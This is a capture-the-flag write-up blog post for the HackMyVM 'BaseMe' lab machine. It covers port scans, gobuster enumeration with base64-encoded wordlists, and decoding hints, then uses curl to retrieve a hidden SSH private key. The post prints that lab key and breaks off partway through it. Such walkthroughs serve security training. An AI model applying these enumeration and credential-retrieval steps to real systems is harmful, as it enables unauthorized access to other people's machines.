<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="BaseMe" /><meta name="author" content="am-a-circle" /><meta property="og:locale" content="en" /><meta name="description" content="Overview" /><meta property="og:description" content="Overview" /><link rel="canonical" href="https://am-a-circle.github.io//posts/BaseME/" /><meta property="og:url" content="https://am-a-circle.github.io//posts/BaseME/" /><meta property="og:site_name" content="am-a-circle" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-25T19:50:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="BaseMe" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@am-a-circle" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"am-a-circle"},"headline":"BaseMe","dateModified":"2021-12-25T20:04:29+08:00","datePublished":"2021-12-25T19:50:00+08:00","description":"Overview","url":"https://am-a-circle.github.io//posts/BaseME/","mainEntityOfPage":{"@type":"WebPage","@id":"https://am-a-circle.github.io//posts/BaseME/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>BaseMe | am-a-circle</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="am-a-circle"><meta name="application-name" content="am-a-circle"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">am-a-circle</a></div><div class="site-subtitle font-italic">Logs of my roots.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/privesc/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>PRIVESC</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/am-a-circle" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>BaseMe</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>BaseMe</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> am-a-circle </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Dec 25, 2021, 7:50 PM +0800" >Dec 25, 2021<i class="unloaded">2021-12-25T19:50:00+08:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Dec 25, 2021, 8:04 PM +0800" >Dec 25, 2021<i class="unloaded">2021-12-25T20:04:29+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1751 words">9 min read</span></div></div><div class="post-content"><h2 id="overview">Overview</h2><p>CTF like box</p><div class="table-wrapper"><table><thead><tr><th>Box Difficulty<th>Link<tbody><tr><td>Easy<td><a href="https://hackmyvm.eu/machines/machine.php?vm=BaseME">hackmyvm Link</a></table></div><h2 id="recon">Recon</h2><p>Objective : Find out all the open ports and do a nmap service scan.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]                                                
â””â”€# rustscan <span class="nt">-a</span> 192.168.56.23                                                        
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.          
| <span class="o">{}</span>  <span class="o">}</span>| <span class="o">{</span> <span class="o">}</span> |<span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span>|  <span class="sb">`</span>| |
| .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> |.-._<span class="o">}</span> <span class="o">}</span> | |  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> |<span class="se">\ </span> |
<span class="sb">`</span>-<span class="s1">' `-'</span><span class="sb">`</span><span class="nt">-----</span><span class="s1">'`----'</span>  <span class="sb">`</span>-<span class="s1">'  `----'</span>  <span class="sb">`</span><span class="nt">---</span><span class="s1">' `-'</span>  <span class="sb">`</span>-<span class="s1">'`-'</span> <span class="sb">`</span>-<span class="s1">'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------                                              
Real hackers hack time âŒ›
                                                                                     
[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan'</span>s speed. Use the Docker image, or up the Ulimit with <span class="s1">'--ulimit 5000'</span><span class="nb">.</span> 
Open 192.168.56.23:22
Open 192.168.56.23:80  

</pre></table></code></div></div><p>We can see that thereâ€™s 2 open port. Port 22 and 80.</p><p>nmap output shows the below:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# nmap <span class="nt">-sV</span> <span class="nt">-sC</span> 192.168.56.23 <span class="nt">-p</span> 22,80 <span class="nt">-o</span> nmap.txt
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-12-25 01:56 EST
Nmap scan report <span class="k">for </span>192.168.56.23
Host is up <span class="o">(</span>0.00048s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 ca:09:80:f7:3a:da:5a:b6:19:d9:5c:41:47:43:d4:10 <span class="o">(</span>RSA<span class="o">)</span>
|   256 d0:75:48:48:b8:26:59:37:64:3b:25:7f:20:10:f8:70 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 91:14:f7:93:0b:06:25:cb:e0:a5:30:e8:d3:d3:37:2b <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:E9:64:8A (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.92 seconds
</span></pre></table></code></div></div><p>Letâ€™s enumerate port 80!</p><h2 id="http--tcp-80">HTTP- TCP 80</h2><p>Gobuster shows that thereâ€™s only <code class="language-plaintext highlighter-rouge">index.html</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.56.23:80 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 100 <span class="nt">-e</span> <span class="nt">-k</span> <span class="nt">-s</span> <span class="s2">"200,204,301,302,307,403,500"</span> <span class="nt">-x</span> <span class="s2">"txt,html,php,php.bak,bak,jsp"</span> <span class="nt">-o</span> gobuster_p80.txt
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://192.168.56.23:80
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 100
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.1.0
<span class="o">[</span>+] Extensions:              txt,html,php,php.bak,bak,jsp
<span class="o">[</span>+] Expanded:                <span class="nb">true</span>
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
2021/12/25 01:57:59 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
http://192.168.56.23:80/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 276]
                                                                      
<span class="o">===============================================================</span>
2021/12/25 01:59:42 Finished
<span class="o">===============================================================</span>
</pre></table></code></div></div><p>Looking at the file shows something interesting.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# curl http://192.168.56.23/index.html
QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK

&lt;<span class="o">!</span><span class="nt">--</span>
iloveyou
youloveyou
shelovesyou
helovesyou
weloveyou
theyhatesme
<span class="nt">--</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>Lets Base64 decode the encrypted first line.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
ALL, absolutely ALL that you need is <span class="k">in </span>BASE64.
Including the password that you need :<span class="o">)</span>
Remember, BASE64 has the answer to all your questions.
<span class="nt">-lucas</span>
</pre></table></code></div></div><p>Looks like a big hint is that everything we are going to search fore or use is in base64. Moving forward we must know that <strong>EVERYTHING</strong> has to be in base64! From folders to password!</p><p>Letâ€™s save the information we found and encode it in base64 first.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# <span class="nb">cat </span>dic.txt                          
iloveyou
youloveyou
shelovesyou
helovesyou
weloveyou
theyhatesme
</pre></table></code></div></div><p>For each line in file, base64 encode it line by line and save it to file <code class="language-plaintext highlighter-rouge">while read line; do base64 &lt;&lt;&lt; "$line"; done &lt; input.txt &gt;&gt; output.txt</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span><span class="nb">base64</span> <span class="o">&lt;&lt;&lt;</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span> &lt; dic.txt <span class="o">&gt;&gt;</span> dic_b64.txt                                                                                          

â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# <span class="nb">cat </span>dic_b64.txt 
aWxvdmV5b3UK
<span class="nv">eW91bG92ZXlvdQo</span><span class="o">=</span>
c2hlbG92ZXN5b3UK
<span class="nv">aGVsb3Zlc3lvdQo</span><span class="o">=</span>
<span class="nv">d2Vsb3ZleW91Cg</span><span class="o">==</span>
dGhleWhhdGVzbWUK
</pre></table></code></div></div><p>Letâ€™s enumerate the files again this time using gobuster with filename which are in base64. To do that, we have to convert the files into base64 encoded.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span><span class="nb">base64</span> <span class="o">&lt;&lt;&lt;</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span> &lt; /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="o">&gt;&gt;</span> directory-list-2.3-medium-base64e.txt      
                                                                                        
â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# <span class="nb">head </span>directory-list-2.3-medium-base64e.txt                                                                                                                     
<span class="nv">IyBkaXJlY3RvcnktbGlzdC0yLjMtbWVkaXVtLnR4dAo</span><span class="o">=</span>
<span class="nv">Iwo</span><span class="o">=</span>
IyBDb3B5cmlnaHQgMjAwNyBKYW1lcyBGaXNoZXIK
<span class="nv">Iwo</span><span class="o">=</span>
IyBUaGlzIHdvcmsgaXMgbGljZW5zZWQgdW5kZXIgdGhlIENyZWF0aXZlIENvbW1vbnMK
IyBBdHRyaWJ1dGlvbi1TaGFyZSBBbGlrZSAzLjAgTGljZW5zZS4gVG8gdmlldyBhIGNvcHkgb2Yg
<span class="nv">dGhpcwo</span><span class="o">=</span>
IyBsaWNlbnNlLCB2aXNpdCBodHRwOi8vY3JlYXRpdmVjb21tb25zLm9yZy9saWNlbnNlcy9ieS1z
<span class="nv">YS8zLjAvCg</span><span class="o">==</span>
IyBvciBzZW5kIGEgbGV0dGVyIHRvIENyZWF0aXZlIENvbW1vbnMsIDE3MSBTZWNvbmQgU3RyZWV0


â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]                                                                                                                                     
â””â”€# gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.56.23:80 <span class="nt">-w</span> directory-list-2.3-medium-base64e.txt <span class="nt">-t</span> 100 <span class="nt">-e</span> <span class="nt">-k</span> <span class="nt">-s</span> <span class="s2">"200,204,301,302,307,403,500"</span> <span class="nt">-x</span> <span class="s2">"txt,html,php,php.bak,bak,jsp"</span>      
<span class="o">===============================================================</span>                                                                                                           
Gobuster v3.1.0                                                                                                                                                           
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>                                                                                                             
<span class="o">===============================================================</span>                                                                                                           
<span class="o">[</span>+] Url:                     http://192.168.56.23:80                                                                                                                      
<span class="o">[</span>+] Method:                  GET                                                                                                                                          
<span class="o">[</span>+] Threads:                 100                                                                                                                                          
<span class="o">[</span>+] Wordlist:                directory-list-2.3-medium-base64e.txt                                                                                                        
<span class="o">[</span>+] Negative Status codes:   404                                                                                                                                          
<span class="o">[</span>+] User Agent:              gobuster/3.1.0                                                                                                                               
<span class="o">[</span>+] Extensions:              bak,jsp,txt,html,php,php.bak                                                                                                                 
<span class="o">[</span>+] Expanded:                <span class="nb">true</span>                                                                                                                                         
<span class="o">[</span>+] Timeout:                 10s                                                                                                                                          
<span class="o">===============================================================</span>                                                                                                           
2021/12/25 04:24:18 Starting gobuster <span class="k">in </span>directory enumeration mode                                                                                                       
<span class="o">===============================================================</span>                                                                                                           
                                      
<span class="o">===============================================================</span>
2021/12/25 04:26:04 Finished
<span class="o">===============================================================</span>
</pre></table></code></div></div><p>Sadly, Nothing found :( Letâ€™s try more.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre> â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span><span class="nb">base64</span> <span class="o">&lt;&lt;&lt;</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span> &lt; /usr/share/seclists/Discovery/Web-Content/common.txt <span class="o">&gt;&gt;</span> common-base64e.txt                                      
                                                                                                                                                                          
â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# <span class="nb">head </span>common-base64e.txt                  
<span class="nv">LmJhc2hfaGlzdG9yeQo</span><span class="o">=</span>
<span class="nv">LmJhc2hyYwo</span><span class="o">=</span>
<span class="nv">LmNhY2hlCg</span><span class="o">==</span>
<span class="nv">LmNvbmZpZwo</span><span class="o">=</span>
<span class="nv">LmN2cwo</span><span class="o">=</span>
<span class="nv">LmN2c2lnbm9yZQo</span><span class="o">=</span>
LmZvcndhcmQK
<span class="nv">LmdpdAo</span><span class="o">=</span>
<span class="nv">LmdpdC1yZXdyaXRlCg</span><span class="o">==</span>
<span class="nv">LmdpdC9IRUFECg</span><span class="o">==</span>
 
â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.56.23:80 <span class="nt">-w</span> common-base64e.txt <span class="nt">-t</span> 100 <span class="nt">-e</span> <span class="nt">-k</span> <span class="nt">-s</span> <span class="s2">"200,204,301,302,307,403,500"</span> <span class="nt">-x</span> <span class="s2">"txt,html,php,php.bak,bak,jsp"</span> 
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://192.168.56.23:80
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 100
<span class="o">[</span>+] Wordlist:                common-base64e.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.1.0
<span class="o">[</span>+] Extensions:              jsp,txt,html,php,php.bak,bak
<span class="o">[</span>+] Expanded:                <span class="nb">true</span>
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
2021/12/25 04:31:16 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
http://192.168.56.23:80/aWRfcnNhCg<span class="o">==</span>         <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2537]
http://192.168.56.23:80/cm9ib3RzLnR4dAo<span class="o">=</span>     <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 25]  
                                                                       
<span class="o">===============================================================</span>
2021/12/25 04:31:19 Finished
<span class="o">===============================================================</span>
</pre></table></code></div></div><p>Nice!</p><h2 id="shell-as-lucas">Shell as lucas</h2><p>We can see that after decoding the base64 we have <code class="language-plaintext highlighter-rouge">id_rsa</code> and <code class="language-plaintext highlighter-rouge">robots.txt</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>Base64 decode the strings shows 
â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# <span class="nb">echo</span> <span class="s2">"aWRfcnNhCg=="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
id_rsa
                                                                                                                                                                                                                                                                                                                          
â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# <span class="nb">echo</span> <span class="s2">"cm9ib3RzLnR4dAo="</span> | <span class="nb">base64</span> <span class="nt">-d</span>                                                                                                                              
robots.txt
</pre></table></code></div></div><p>Letâ€™s save the id_rsa!</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]                                                
â””â”€# curl http://192.168.56.23/aWRfcnNhCg<span class="o">==</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> id_rsa                           
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current      
                                 Dload  Upload   Total   Spent    Left  Speed        
100  2537  100  2537    0     0  1792k      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 2477k       
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----                                                  
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL
BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1
cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG
07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh
7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv
f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4
vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X
YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK
xkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs
+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi
NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ
zjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0
IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI
pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ
